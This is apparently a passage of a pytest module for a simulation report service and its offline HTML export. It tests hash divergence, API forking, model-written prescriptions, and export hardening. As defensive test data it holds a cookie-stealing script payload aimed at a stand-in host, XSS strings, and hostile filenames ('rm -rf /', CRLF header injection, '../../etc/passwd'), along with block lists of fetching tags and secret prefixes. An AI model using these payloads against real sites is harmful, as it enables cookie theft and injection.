    The localisation is `verify.compare_checkpoint`'s, which is the payoff for the per-subsystem
    sub-hashes: a divergence says which subtree, not merely that the state changed.
    """
    recorder = played("run-bent", 0, 4)
    bent = next(
        index
        for index, event in enumerate(recorder.log)
        if event.kind is EventKind.DAY_CHECKPOINT
    )
    payload = recorder.log[bent].decoded_payload()
    payload["state_hash"] = "0" * 64
    recorder.log[bent] = Envelope.from_dict(
        {**recorder.log[bent].to_dict(), "payload": canonical.encode(payload)}
    )

    entry = _built(recorder).timelines[0]

    assert len(entry.diverged_days) == 1
    diverged = entry.diverged_days[0]
    assert diverged["day"] == simtime.day_of(int(payload["tick"]))
    assert diverged["subsystems"] == [], "no subsystem moved, so none should be named"
    assert not entry.trustworthy
    assert entry.readings, "a bent hash suppressed the figures rather than being reported beside them"


# =========================================================================
# The published surface
# =========================================================================


@pytest.fixture
def composed(tmp_path, monkeypatch):
    """A kernel, a gateway and the mounted report in one process, with a run ready to drive."""
    monkeypatch.setenv("COMPANY_OS_STORE_URL", f"sqlite:///{tmp_path}/universe.sqlite3")

    from agents import main as agents_main
    from gateway.commands import CommandLedger

    import single_process

    agents_main._LEDGER = None
    agents_main._dispose_log_engine()

    runtime, _ = single_process.compose()
    runtime.create_run(ROOT, SEED, horizon_tick=simtime.TICKS_PER_SIM_DAY * 30)

    from gateway import main as gateway_main

    gateway_main._ledger = CommandLedger()

    yield runtime
    runtime.writer.stop()
    agents_main.ledger().dispose()


@pytest.fixture
def api(composed):
    from gateway import main as gateway_main

    with TestClient(gateway_main.app) as client:
        yield client


def _fork_through_the_api(runtime, api, days: int = 3) -> str:
    """A second timeline, made the way a player makes one."""
    run = runtime.runs[ROOT]
    runtime.apply_command(
        ROOT,
        __import__("contracts.grpc.kernel_pb2", fromlist=["x"]).ASSIGN_WORK,
        canonical.encode({"item": "wi_ap_map", "person": "stf_ap", "via_manager": False}),
    )
    while run.state.items["wi_ap_map"].status != "blocked":
        runtime._advance(run, 1)

    applied = api.post(
        f"/runs/{ROOT}/commands",
        json={
            "kind": "resolve_checkpoint",
            "payload": {"item": "wi_ap_map", "cp_index": 0, "option_index": 0, "in_person": True},
            "idempotency_key": "u20-settle",
        },
    ).json()
    assert applied["status"] == "applied", applied

    forked = api.post(
        f"/runs/{ROOT}/fork",
        json={
            "at_seq": applied["produced_seq"][0],
            "option_index": 1,
            "idempotency_key": "u20-fork",
        },
    ).json()
    assert not forked.get("refusal"), forked

    for run_id in (ROOT, forked["child_run_id"]):
        held = runtime.runs[run_id]
        while held.state.tick < simtime.tick_of_day_start(days):
            runtime._advance(held, 1)
    return forked["child_run_id"]


def test_the_universe_answers_on_the_report_surface_the_launcher_mounts(composed, api) -> None:
    """Covers M53 through the published surface, and resolves every claim against the store."""
    child = _fork_through_the_api(composed, api)

    answered = api.get(f"/report/runs/{child}/universe")

    assert answered.status_code == 200, answered.text
    body = answered.json()
    assert body["root_run_id"] == ROOT and body["asked_about"] == child
    assert [entry["run_id"] for entry in body["timelines"]] == [ROOT, child]
    assert body["every_number_is"] == universes.AUTHORED
    assert body["invented_company"]

    reachable = {
        entry["run_id"]: {claim["at_seq"] for claim in entry["report"]["claims"]}
        for entry in body["timelines"]
    }
    assert body["claims"]
    for claim in body["claims"]:
        assert claim["run_id"] in reachable


def test_the_launcher_is_what_joins_the_report_to_the_bench(composed) -> None:
    """R28's fifth composed callable, asserted at both ends of it.

    The report may not import the agents service and the agents service holds the only provider
    call in the tree, so the two are joined by the launcher or not at all. What makes that more
    than bookkeeping is the direction: what crosses is a packet the report built, and there is
    no call the agents service can make that would add a proposal — it is never given the
    catalog, the fold, or the store read that would let it find one.
    """
    from agents import main as agents_main
    from report import main as report_main

    assert report_main._prescriber is agents_main.write_prescription


def test_the_prescription_reaches_the_surface_with_its_prose_over_it(composed, api) -> None:
    """M57 and M58 end to end, through the route the launcher mounts and the seam it installs.

    The producer here stands where the agents service stands in a composed process: the launcher
    hands the report a callable, the report hands it packets it built, and what comes back is
    attached by id and guarded before it is rendered. A producer answering about a proposal the
    report did not make is in the same reply, and is discarded — which is the structural half of
    "no prescription originates in a model".
    """
    from report import main as report_main

    over = "run-over-api"
    run = composed.create_run(over, SEED, scenario=OVERLOADED)
    while run.state.tick < simtime.tick_of_day_start(6):
        composed._advance(run, 1)

    asked: list[dict] = []

    def prescriber(run_id: str, packets: list[dict]) -> list[dict]:
        asked.append({"run": run_id, "proposals": [entry["proposal"] for entry in packets]})
        written = [
            {
                "proposal": packet["proposal"],
                "sentences": [
                    {
                        "text": (
                            "The line has been over its ceiling, and this would take "
                            f"{packet['removes_draw_hours_per_month']} hours a month off it."
                        ),
                        "citations": packet["citable"][:1],
                    }
                ],
                "model_identity": "a-model",
            }
            for packet in packets
        ]
        return written + [{"proposal": "au_nobody_authored_this", "sentences": []}]

    report_main.use_prescriber(prescriber)
    try:
        answered = api.get(f"/report/runs/{over}/universe")
    finally:
        report_main.use_prescriber(None)

    assert answered.status_code == 200, answered.text
    body = answered.json()

    assert body["proposals"], "the overloaded company proposed nothing through the surface"
    assert asked and asked[0]["run"] == body["root_run_id"]
    ids = [proposal["id"] for proposal in body["proposals"]]
    assert "au_nobody_authored_this" not in ids

    for proposal in body["proposals"]:
        assert proposal["note"]["status"] == prescribing.WRITTEN, proposal["note"]
        assert proposal["note"]["sentences"], proposal["id"]
        assert proposal["payback"] and proposal["evidence"], proposal["id"]

    assert body["prescription_rule"]["min_overload_days"] == prescribing.MIN_OVERLOAD_DAYS


def test_with_no_producer_installed_the_surface_still_carries_the_figures(composed, api) -> None:
    """The keyless path for the report: a proposal minus its paragraph is still a proposal."""
    from report import main as report_main

    over = "run-over-keyless"
    run = composed.create_run(over, SEED, scenario=OVERLOADED)
    while run.state.tick < simtime.tick_of_day_start(6):
        composed._advance(run, 1)

    report_main.use_prescriber(None)
    body = api.get(f"/report/runs/{over}/universe").json()

    assert body["proposals"]
    for proposal in body["proposals"]:
        assert proposal["note"]["status"] == prescribing.ABSENT
        assert proposal["payback"] and proposal["evidence"]


def test_a_run_this_store_never_heard_of_has_no_universe(composed, api) -> None:
    answered = api.get("/report/runs/run-nowhere/universe")

    assert answered.status_code == 404
    assert "run-nowhere" in answered.json()["detail"]


# =========================================================================
# Helpers that need a store
# =========================================================================


def _over(built, run_id: str) -> universes.Universe:
    """The Universe report for a lineage the kernel really forked."""
    tree = lin.tree(built.store.engine, run_id, simtime.TICKS_PER_SIM_DAY)
    assert tree is not None
    logs = {
        node.run_id: reporting.TimelineLog(
            run_id=node.run_id, events=built.events(node.run_id), current_tick=node.tick
        )
        for node in tree.nodes
    }
    return universes.build(tree, logs)


def test_a_lineage_built_on_each_dialect_reports_the_same_tree(tmp_path) -> None:
    """One store's answer is not one dialect's answer.

    The lineage fixture already runs every test above on both, and this states the stronger
    thing: two stores of two dialects, built from one seed, produce the same Universe — the same
    timelines in the same order, with the same figures under them.
    """
    shapes = []
    for dialect in ("sqlite", "postgresql"):
        store_dir = tmp_path / dialect
        store_dir.mkdir()
        with kernel_on(dialect, store_dir) as runtime:
            built = build_lineage(runtime)
            universe = _over(built, built.root)
            shapes.append(
                [
                    (
                        entry.run_id.startswith("run-lineage"),
                        entry.current_day,
                        len(entry.spans),
                        sorted(claim.label for claim in (entry.report.claims if entry.report else [])),
                    )
                    for entry in universe.timelines
                ]
            )
    assert shapes[0] == shapes[1]


# =========================================================================
# The standalone export (U22 — M54, M60, M61, R25)
# =========================================================================
#
# This is the one artifact that leaves the machine. Every other surface is read by somebody in
# front of the process that produced it; this file is written to be attached to a message and
# opened from a stranger's filesystem, where a script still reaches the network. So what is
# pinned here is not "the document renders" — it is the four properties that make sending it
# safe and the two that make it worth sending:
#
# * **it reaches for nothing** (M54). No subresource, no stylesheet link, no font, no image
#   element — asserted over the parsed document rather than by inspection, because the failure
#   is one attribute in one element nobody looked at;
# * **it executes nothing, and says so in a policy it carries** (R25). The bytes travel, so the
#   policy has to travel with them: a response header governs the file while it is served and
#   nothing at all once it is on a disk;
# * **it escapes by construction, not by discipline.** Everything interpolated came from a
#   scenario, a model or a URL, and the test that markup renders as text runs on both halves;
# * **it declares what it contains**, and a field no class declares refuses the export rather
#   than riding along in it;
# * **its QR code resolves to the repository** (M60) — decoded, not assumed;
# * **it is reachable from a live run in one action** (M61), which is asserted here on the route
#   and in `frontend/tests/report.test.ts` on the anchor.


def _elements(document: str) -> list[tuple[str, dict[str, str]]]:
    """Every element in the document, with its attributes, as a browser's parser would see them.

    Parsed rather than grepped. `"<script"` is absent from a document carrying `< script` and
    from one where the tag arrived through an attribute value, and both of those are exactly the
    shapes a search for a literal misses.
    """
    from html.parser import HTMLParser

    found: list[tuple[str, dict[str, str]]] = []

    class Reader(HTMLParser):
        def handle_starttag(self, tag: str, attrs) -> None:
            found.append((tag, {name: value or "" for name, value in attrs}))

        handle_startendtag = handle_starttag  # type: ignore[assignment]

    reader = Reader(convert_charrefs=True)
    reader.feed(document)
    reader.close()
    return found


#: Elements that fetch something, navigate somewhere, or run. None of them may appear.
#:
#: `meta` is absent because the document needs four of them; the one dangerous kind — an
#: `http-equiv` refresh, which is a navigation — is refused by name below.
_REACHING_OUT = frozenset(
    {
        "script", "link", "img", "iframe", "frame", "frameset", "object", "embed", "applet",
        "video", "audio", "source", "track", "base", "form", "input", "button", "textarea",
        "select", "portal", "image", "use", "foreignobject",
    }
)

#: Attributes that name something to fetch, submit to, or ping.
_FETCHING = frozenset(
    {
        "src", "srcset", "poster", "data", "action", "formaction", "background", "ping",
        "codebase", "archive", "manifest", "xlink:href", "lowsrc", "dynsrc",
    }
)

#: The one absolute URL in the document that is not the repository: SVG's namespace, which is an
#: identifier rather than an address and is never resolved by anything.
_SVG_NAMESPACE = "http://www.w3.org/2000/svg"


def _document(universe: universes.Universe) -> str:
    return exporting.render(universe.to_dict())


def _articles(document: str) -> list[str]:
    """Each timeline's own section, so a claim about one is not satisfied by another's text.

    Closed at the first `</article>`, which is this timeline's: a timeline section holds
    headings, paragraphs and tables and never another article. The unclosed version passed the
    last timeline the whole rest of the document, which made "this section states no figure"
    true of nothing.
    """
    return [
        block.split("</article>")[0]
        for block in document.split('<article class="timeline')[1:]
    ]


def _payload(universe: universes.Universe) -> dict:
    """A payload a test may edit without editing the Universe it came from.

    `Universe.to_dict` hands back its `company` mapping and its separations by reference, which
    is harmless for a route that serialises and discards them and is not harmless here: the
    fixture below is module-scoped, so one test's smuggled `<img>` would be the next test's
    starting state. Found that way, in this file, by two tests that pass alone and fail in the
    order the suite happened to run them in.
    """
    import copy

    return copy.deepcopy(universe.to_dict())


def _rich(run_id: str = "run-rich", *, days: int = 30) -> Recorder:
    """The overloaded company, driven until every list in its report has something in it.

    Three deliberate things happen to it. The freelancer decision is settled on day four rather
    than on day one, for the reason `_settled_overloaded` gives — settling it immediately
    relieves the line and there is nothing left to prescribe. A hire into another line is
    requested, which is the one derivation that raises an Authorization (U15). And it runs to
    day thirty, because `LOAD_CHANGED` only fires on a day that produced morale counters and a
    short run has an empty `load_events`.

    The horizon is set past the target day: the shipped default ends a run well before thirty,
    and a fixture that quietly terminated early would cover fewer paths every time somebody
    re-tuned it.
    """
    recorder = Recorder(
        run_id,
        horizon_tick=simtime.TICKS_PER_SIM_DAY * (days + 10),
        scenario=scenarios.load(OVERLOADED),
    )
    recorder.advance_until(lambda s: s.tick >= simtime.tick_of_day_start(4))
    recorder.record(sim.resolve_checkpoint(recorder.state, "wk_freelance", 0, 0, in_person=True))
    recorder.record(sim.request_hire(recorder.state, "dir_care"))
    recorder.advance_until(
        lambda s: s.tick >= simtime.tick_of_day_start(days) or bool(s.terminal_reason)
    )
    return recorder


def _holed(run_id: str = "run-holed-export") -> Recorder:
    recorder = _rich(run_id, days=6)
    recorder.log = [event for event in recorder.log if event.seq != 3]
    return recorder


def _bent(run_id: str = "run-bent-export") -> Recorder:
    """A timeline whose first day boundary does not fold to the hash the log records."""
    recorder = _rich(run_id, days=6)
    at = next(
        index
        for index, event in enumerate(recorder.log)
        if event.kind is EventKind.DAY_CHECKPOINT
    )
    payload = recorder.log[at].decoded_payload()
    payload["state_hash"] = "0" * 64
    recorder.log[at] = Envelope.from_dict(
        {**recorder.log[at].to_dict(), "payload": canonical.encode(payload)}
    )
    return recorder


def _unfoldable(run_id: str = "run-broken-export") -> Recorder:
    recorder = _rich(run_id, days=4)
    recorder.log = [
        Envelope.from_dict({**event.to_dict(), "rules_ver": "not-the-running-rules"})
        for event in recorder.log
    ]
    return recorder


@pytest.fixture(scope="module")
def everything() -> universes.Universe:
    """A Universe holding one of everything the export can carry.

    Module-scoped and read-only. Driving four timelines to day thirty is the most expensive
    fixture in this file, and the three tests that need full coverage all need the same one.
    Anything that wants to *change* a payload renders from `to_dict()`, which is a fresh
    structure every call.
    """
    universe = _built(_rich(), _holed(), _bent(), _unfoldable())
    assert universe.proposals, "the fixture stopped producing a proposal to write prose over"
    prescribing.attach(
        universe.proposals,
        [
            {
                "proposal": universe.proposals[0].id,
                "sentences": [
                    {
                        "text": "The People line carried this for every day of the run.",
                        "citations": sorted(universe.proposals[0].citable())[:1],
                    }
                ],
                "model_identity": "a-provider/a-model",
            }
        ],
    )
    assert universe.proposals[0].note.status == prescribing.WRITTEN, (
        universe.proposals[0].note.reason
    )
    return universe


@pytest.fixture(scope="module")
def the_other_company() -> universes.Universe:
    """The shipped default, run long enough to ship something and lose somebody.

    Its two lists are the ones the overloaded company does not fill: `deliverables`, because
    nothing in Ashcroft's opening state reaches delivery inside thirty days, and `attrition`,
    because nobody walks out of it. Both are content classes the export declares, so both have
    to come from a run rather than from a dictionary written here.
    """
    recorder = Recorder("run-shipped", horizon_tick=simtime.TICKS_PER_SIM_DAY * 40)
    recorder.settle(0)
    recorder.record(sim.request_hire(recorder.state, "dir_cs"))
    recorder.advance_until(
        lambda s: s.tick >= simtime.tick_of_day_start(30) or bool(s.terminal_reason)
    )
    report = _built(recorder).timelines[0].report
    assert report is not None and report.deliverables and report.attrition, (
        "the fixture stopped producing a deliverable and an attrition"
    )
    return _built(recorder)


# --- it reaches for nothing (M54) ------------------------------------------


def test_the_exported_file_reaches_for_nothing(everything) -> None:
    """M54, asserted over the parsed document rather than in a browser.

    **What the plan asked for was "load it with the network blocked", and this is the stronger
    half of that done deterministically.** A browser with a blocked network proves the document
    *worked* without one; it does not prove nothing was attempted, because a blocked request is
    a silent failure and a font that fell back looks identical to one that was never asked for.
    What is asserted instead is that there is nothing in the document a browser could fetch: no
    element that loads a subresource, no attribute that names one, no `url()` or `@import` in
    the stylesheet, and no absolute URL anywhere except the repository link the reader clicks
    and SVG's namespace, which is an identifier nothing resolves.
    """
    import re as regex

    document = _document(everything)

    for tag, attrs in _elements(document):
        assert tag not in _REACHING_OUT, f"<{tag}> would make the document reach for something"
        assert not (_FETCHING & attrs.keys()), f"<{tag}> carries {sorted(_FETCHING & attrs.keys())}"
        assert attrs.get("http-equiv", "").lower() != "refresh", "a meta refresh is a navigation"

    assert "url(" not in document and "@import" not in document

    urls = {
        found
        for found in regex.findall(r"https?://[^\s\"'<>]+", document)
        if found not in (exporting.REPOSITORY, _SVG_NAMESPACE)
    }
    assert not urls, f"the document names addresses it did not need: {sorted(urls)}"


def test_the_document_executes_nothing_and_carries_the_policy_that_says_so() -> None:
    """R25's other two clauses, over a payload that is trying to smuggle a script in.

    The policy is in the document rather than only on the response, because the response is gone
    the moment the file is saved — and saving it is what the artifact is for.
    """
    universe = _built(_overloaded())
    payload = universe.to_dict()
    payload["company"]["title"] = "<script>fetch('http://elsewhere/' + document.cookie)</script>"

    document = exporting.render(payload)
    tags = {tag for tag, _ in _elements(document)}
    attributes = {name for _, attrs in _elements(document) for name in attrs}

    assert "script" not in tags
    assert not [name for name in attributes if name.startswith("on")]
    assert "javascript:" not in document.lower()

    policy = next(
        attrs["content"]
        for tag, attrs in _elements(document)
        if tag == "meta" and attrs.get("http-equiv") == "Content-Security-Policy"
    )
    assert policy.startswith("default-src 'none'")
    assert "'unsafe-inline'" not in policy and "'unsafe-eval'" not in policy


def test_the_policy_admits_exactly_the_stylesheet_the_document_carries() -> None:
    """A hash is only a policy if it is the hash of what is there.

    The obvious way for this to rot is for somebody to edit `STYLE` through a helper that
    normalises whitespace on the way into the element — at which point the browser drops the
    stylesheet and the suite, which only ever checked that a hash was present, stays green.
    """
    import base64
    import hashlib
    import re as regex

    document = _document(_built(_overloaded()))
    carried = regex.search(r"<style>(.*?)</style>", document, regex.DOTALL)
    assert carried is not None

    digest = base64.b64encode(hashlib.sha256(carried.group(1).encode("utf-8")).digest()).decode()
    assert f"'sha256-{digest}'" in exporting.csp()


def test_markup_in_a_scenario_field_and_in_a_model_sentence_renders_as_text(everything) -> None:
    """R25, on both halves of the corpus this document interpolates.

    Both are content this repository did not write and cannot re-review: a scenario arrives by
    pull request, and a sentence arrives from a provider. They are tested together because the
    escaping has to be one mechanism — the failure mode is a second path somebody added for the
    half that "obviously came from us".
    """
    payload = _payload(everything)
    payload["company"]["summary"] = "<img src=x onerror=alert(1)>"
    payload["proposals"][0]["note"]["sentences"][0]["text"] = "</p><script>alert(2)</script>"

    document = exporting.render(payload)
    tags = {tag for tag, _ in _elements(document)}

    assert "script" not in tags and "img" not in tags
    assert "&lt;img src=x onerror=alert(1)&gt;" in document
    assert "&lt;script&gt;alert(2)&lt;/script&gt;" in document


def test_a_document_over_content_carrying_no_markup_escapes_nothing(everything) -> None:
    """The other side of the escaping claim, and the one that catches a whole bug class.

    `Html + Html` is a plain `str` — `str.__add__` knows nothing about the subclass — so a
    fragment built by concatenation gets escaped as text by the next `join` it reaches, and the
    document renders `<dt>Lineage root</dt>` as visible characters. Found exactly that way, in
    the browser, on the first render. Neither shipped scenario contains a `<`, so on this
    fixture an escaped `&lt;` can only be the document eating its own markup.
    """
    assert "&lt;" not in _document(everything)


def test_the_export_names_no_path_no_dsn_no_environment_value_and_no_provider(everything) -> None:
    """What the file must not carry out of the machine that made it."""
    document = _document(everything)

    for leak in (
        "/Users/", "/home/", "/app/", "C:\\",
        "postgresql://", "postgres://", "sqlite://",
        "COMPANY_OS_", "OPENAI", "ANTHROPIC", "Bearer ", "sk-",
    ):
        assert leak not in document, f"the export carries {leak!r}"


# --- what it declares it contains ------------------------------------------


def test_the_manifest_covers_a_lineage_driven_far_enough_to_fill_it(
    everything, the_other_company
) -> None:
    """Every field of a full report belongs to a declared content class.

    Run over two companies because neither fills every list on its own: Ashcroft overloads a
    line and produces a prescription, and the shipped default ships a deliverable and loses
    somebody. `leaf_paths` yields nothing for an empty list, so a fixture that never reached a
    deliverable would pass this vacuously — which is why the fixtures assert their own contents.
    """
    for universe in (everything, the_other_company):
        assert declaring.undeclared(universe.to_dict()) == []


def test_the_manifest_declares_nothing_the_report_never_produces(
    everything, the_other_company
) -> None:
    """The declaration read the other way round, which is what keeps it honest.

    A manifest only ever added to is a manifest that eventually describes a document nobody
    ships. Every pattern here has to match something a real fold produced, so a field removed
    from the report takes its declaration with it — and a line written for a field that was
    renamed fails on the day of the rename rather than years later.
    """
    produced = {
        path
        for universe in (everything, the_other_company)
        for path in declaring.leaf_paths(universe.to_dict())
    }
    idle = [
        pattern
        for pattern in sorted(declaring.DECLARED)
        if not any(declaring._matches(path, pattern) for path in produced)
    ]
    assert idle == [], f"declared and never produced: {idle}"


def test_a_field_no_content_class_declares_refuses_the_export(everything) -> None:
    """The manifest is load-bearing: an undeclared field stops the file being written.

    Refused rather than dropped. A renderer that silently ignored what it did not know would
    make the manifest a comment, and the failure this guards is a field that quietly starts
    travelling — which nobody notices from a document that looks the same.
    """
    payload = _payload(everything)
    payload["timelines"][0]["report"]["retrieved_context"] = ["what a director was shown"]

    with pytest.raises(exporting.UndeclaredContent) as refused:
        exporting.render(payload)

    assert "timelines[].report.retrieved_context[]" in str(refused.value)
    assert declaring.undeclared(payload) == ["timelines[].report.retrieved_context[]"]


def test_the_model_that_wrote_the_prose_is_declared_withheld_and_never_printed(everything) -> None:
    """One field is declared and deliberately not carried, and the two halves are tested apart.

    Declared, so `undeclared` stays empty and nobody "fixes" the manifest by adding it to a
    carried class; withheld, so the value never reaches the bytes. Which provider an operator
    ran is theirs, and this file travels.
    """
    identity = everything.proposals[0].note.model_identity
    assert identity, "the fixture stopped naming a model, so the assertion below proves nothing"

    assert declaring.WITHHELD == {"proposals[].note.model_identity"}
    assert identity not in _document(everything)
    assert "a model" in _document(everything), "the document stopped saying a model wrote anything"


def test_the_document_lists_the_content_classes_it_is_bound_by(everything) -> None:
    """§ What this file contains is the declaration, not a paragraph beside it."""
    import html as escaping

    document = _document(everything)
    for content in declaring.MANIFEST:
        assert escaping.escape(content.name) in document
        # Escaped before comparing, because several of these sentences contain an apostrophe and
        # the document is the escaped copy. Comparing the raw string would have passed for every
        # class that happened not to have one.
        assert escaping.escape(content.says) in document


# --- where it says it came from (M60) --------------------------------------


def test_the_link_and_the_qr_code_both_resolve_to_the_repository(everything) -> None:
    """M60, with the QR code decoded rather than assumed.

    The asset is checked in rather than encoded at runtime (execution decision §5), which leaves
    exactly one way for it to be wrong: it is a picture, and a picture of the wrong URL looks
    like a picture of the right one. `tests/qrread.py` reads the SVG's own path data back into a
    module grid and parses the segment out of it, so the thing decoded is the thing the document
    embeds.
    """
    import qrread

    encoded, level, mask = qrread.read(exporting.qr_svg())

    assert encoded == exporting.REPOSITORY
    assert level == "M", "a lower level would be a QR code that scans worse from a screen"
    assert 0 <= mask <= 7

    document = _document(everything)
    links = {attrs.get("href") for tag, attrs in _elements(document) if tag == "a"}
    assert links == {exporting.REPOSITORY}
    assert exporting.qr_svg() in document


def test_the_qr_asset_is_inline_ascii_and_runs_nothing() -> None:
    """The asset is one of two places this repository writes raw markup, so it is read here.

    An SVG is a document format with a scripting model of its own, and an `<svg>` element inline
    in HTML is parsed as markup rather than as an image — so a `<script>` inside this file would
    execute exactly as one in the page would. Non-ASCII matters for a different reason: the
    string is written straight into a UTF-8 document, and a stray byte here would be one nobody
    reviewed.
    """
    svg = exporting.qr_svg()

    assert svg.isascii()
    assert svg.startswith("<svg") and svg.endswith("</svg>")
    tags = {tag for tag, _ in _elements(svg)}
    assert tags <= {"svg", "title", "rect", "path"}
    assert not [name for _, attrs in _elements(svg) for name in attrs if name.startswith("on")]


def test_raw_markup_is_constructed_in_two_places_and_both_are_this_repositorys() -> None:
    """The escaping argument in one assertion.

    `markup.raw` is the only way unescaped bytes reach the document, so the number of call sites
    *is* the size of the trusted surface. Two: the checked-in QR asset and the stylesheet. A
    third is a review conversation rather than a silent hole — which is what this test is for,
    because a third would otherwise look like any other line.

    The second half is the way around it: `Html(...)` constructs the same type without going
    through `raw`, so it is confined to the module that defines it.
    """
    import re as regex
    from pathlib import Path

    from report import markup

    service = Path(markup.__file__).parent
    sources = {
        path.name: path.read_text(encoding="utf-8")
        for path in sorted(service.glob("*.py"))
    }

    trusted = {
        name: len(regex.findall(r"(?<![\w.])raw\(", source))
        for name, source in sources.items()
        if name != "markup.py"
    }
    assert sum(trusted.values()) == 2 and trusted["export.py"] == 2, (
        f"raw markup is constructed somewhere new: {trusted}. Every value the document "
        "interpolates came from a scenario, a model or a URL; adding a third unescaped source "
        "is a decision, not a refactor."
    )

    bypassing = {
        name: len(regex.findall(r"\bHtml\(", source))
        for name, source in sources.items()
        if name != "markup.py" and regex.search(r"\bHtml\(", source)
    }
    assert bypassing == {}, f"the Html type is constructed outside markup.py: {bypassing}"


# --- the figures, the timelines, and the name it is saved under -------------


def test_every_figure_in_the_document_carries_the_marking(everything) -> None:
    """M59 on this surface, as the completeness claim the client's sweep makes.

    The marking travels with the figure rather than sitting once at the top, so this counts
    elements rather than searching for a sentence: every `.figure` carries the attribute, and
    there are enough of them that a renderer which stopped marking would fail rather than pass
    with nothing to check.
    """
    marked = [
        attrs
        for tag, attrs in _elements(_document(everything))
        if tag == "span" and attrs.get("class") == "figure"
    ]

    assert len(marked) > 100, "too few figures for this to be a completeness check"
    assert all("data-authored-tuning" in attrs for attrs in marked)


def test_the_export_carries_every_timeline_the_on_screen_report_showed(everything) -> None:
    """The file and the route are one fold, so the tree in the document is the tree on the wire."""
    document = _document(everything)
    shown = [entry["run_id"] for entry in everything.to_dict()["timelines"]]

    assert len(shown) == 4
    for run_id in shown:
        assert run_id in document

    refused = next(entry for entry in everything.timelines if entry.refusal)
    assert refused.refusal in document, "a timeline that would not fold vanished from the export"


def test_a_timeline_that_would_not_fold_states_its_refusal_and_states_no_figures(
    everything,
) -> None:
    """The live defect this unit found, and the shape of it is worth keeping written down.

    A refused timeline used to fall through to the same blocks every other one gets, against an
    empty report — so it rendered `None` taken of `None` offered, a `Shipped` of `None`, and a
    last event at `seq None`, each wearing the authored-tuning marking. Four fabrications on the
    one timeline whose whole point is that it has no figures.

    **No suite could have seen it**, and that is the interesting part: every existing assertion
    about a refused timeline is about the *payload*, where `report` is correctly `None` and
    `refusal` correctly carries a sentence. The payload was right the whole time. It took
    rendering a lineage whose only member had been written under other rules and reading the
    page.
    """
    document = _document(everything)
    refused = next(entry for entry in everything.timelines if entry.refusal)

    article = next(
        block for block in _articles(document) if refused.run_id in block
    )
    assert refused.refusal in article
    assert 'class="figure"' not in article, "a timeline with no fold stated figures anyway"
    assert "None" not in article


def test_a_universe_that_folded_nothing_states_absences_rather_than_blanks() -> None:
    """One broken input costing the whole report is the failure U20 built against.

    The document still renders, still says where it came from, and says plainly that it knows no
    company rather than printing an empty identifier where one should be — which reads as a
    missing value rather than as a report that correctly has none.
    """
    broken = played("run-all-broken", 0, 4)
    broken.log = [
        Envelope.from_dict({**event.to_dict(), "rules_ver": "not-the-running-rules"})
        for event in broken.log
    ]

    document = _document(_built(broken))

    assert "could not be folded" in document
    assert "No figure in this document resolves to an event" in document
    assert "names no company" in document
    assert 'class="mono"></span>' not in document, "an identifier rendered as a blank"
    # The load ceiling is still stated: it is a constant of the simulator rather than a reading,
    # so it survives a Universe that folded nothing. Every figure that would have come from a
    # fold is gone, which is what the timelines' own sections are checked for.
    assert all('class="figure"' not in block for block in _articles(document))


def test_two_exports_of_one_universe_are_byte_identical(everything) -> None:
    """The artifact is identified by its lineage root, which a timestamp would have broken.

    Two exports of one Universe are the same document — that is what makes it a document about a
    company rather than about the moment somebody pressed the link, and it is why nothing here
    is stamped with a wall clock.
    """
    assert _document(everything) == _document(everything)


def test_the_filename_derives_from_a_validated_identifier() -> None:
    """A run id is whatever `POST /runs` accepted, and this one lands in a response header.

    The kernel refuses only control characters, so a quote, a semicolon, a slash and a
    right-to-left run are all reachable ids — and the last three would be a header a caller
    wrote. Unusable parts are dropped rather than the export refused: the report is fine, and
    the document prints the root id in full whatever the file is called.
    """
    assert exporting.filename_for("run-cc3c2f6565de") == "company-os-report-run-cc3c2f6565de.html"
    assert exporting.filename_for("demo.1_a") == "company-os-report-demo.1_a.html"

    for hostile in ('a"; rm -rf /', "a\r\nSet-Cookie: x=y", "../../etc/passwd", "や", ""):
        name = exporting.filename_for(hostile)
        assert name.startswith("company-os-report-") and name.endswith(".html")
        body = name[len("company-os-report-") : -len(".html")]
        assert body and re.fullmatch(r"[A-Za-z0-9._-]+", body), name

    # Derived, so two ids the pattern cannot keep are still two different files.
    assert exporting.filename_for("ゆ") != exporting.filename_for("や")


# --- through the surface (M61) ---------------------------------------------


def test_the_export_answers_on_the_report_surface_the_launcher_mounts(composed, api) -> None:
    """M61's backend half: one GET on the mounted route, and a whole file comes back.

    Through the gateway's own client, which is what the anchor in the client reaches: the
    launcher mounts this app at `/report` inside the one process, so `/api/report/...` is the
    same proxy prefix every other call uses and there is no second port to reach.
    """
    child = _fork_through_the_api(composed, api)

    answered = api.get(f"/report/runs/{child}/universe.html")

    assert answered.status_code == 200, answered.text
    assert answered.headers["content-type"].startswith("text/html")
    assert answered.headers["content-disposition"] == (
        f'inline; filename="{exporting.filename_for(ROOT)}"'
    )
    assert answered.headers["content-security-policy"].startswith("default-src 'none'")

    document = answered.text
    assert document.startswith("<!doctype html>")
    # Identified by the root, whichever timeline asked — the same claim the JSON route makes,
    # asserted again here because this is the copy that gets mailed.
    assert ROOT in document and child in document
    assert "script" not in {tag for tag, _ in _elements(document)}


def test_exporting_a_run_mid_flight_reports_through_its_current_tick(composed, api) -> None:
    """A run still going is not a reason to refuse a report, and the two must agree.

    The export and the JSON route are one fold called twice, so the day each timeline reached is
    the same in both — which is the property that would break first if somebody gave the export
    a reader of its own.
    """
    child = _fork_through_the_api(composed, api)

    wire = api.get(f"/report/runs/{child}/universe").json()
    document = api.get(f"/report/runs/{child}/universe.html").text

    for entry in wire["timelines"]:
        assert entry["report"]["outcome"]["reason"] == "running"
        assert f"day {entry['current_day']}, tick {entry['reached_tick']:,}" in document


def test_a_run_this_store_never_heard_of_has_no_file_either(composed, api) -> None:
    """The export answers 404 where the report does, rather than rendering an empty document."""
    assert api.get("/report/runs/never-existed/universe.html").status_code == 404
